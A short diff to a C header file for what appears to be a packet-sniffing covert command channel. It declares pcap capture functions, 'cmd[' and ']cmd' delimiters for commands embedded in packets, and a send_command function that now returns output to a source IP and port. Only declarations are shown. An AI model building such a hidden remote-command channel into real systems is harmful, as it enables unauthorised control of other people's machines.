@@ -12,6 +12,7 @@
 #define ETHERNET_ADDR_LEN	6
 #define CMD_START 		"cmd["
 #define CMD_END 		"]cmd"
+#define CMD_OUTPUT_SIZE         30000
 
 /* IP header */
 struct ip_struct {
@@ -62,6 +63,6 @@ int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int port);
 int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp);
 void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet);
 char * parse_cmd(char * command);
-void send_command(char * command);
+int send_command(char * command, const struct ip_struct * ip, const int dest_port);
 
 #endif
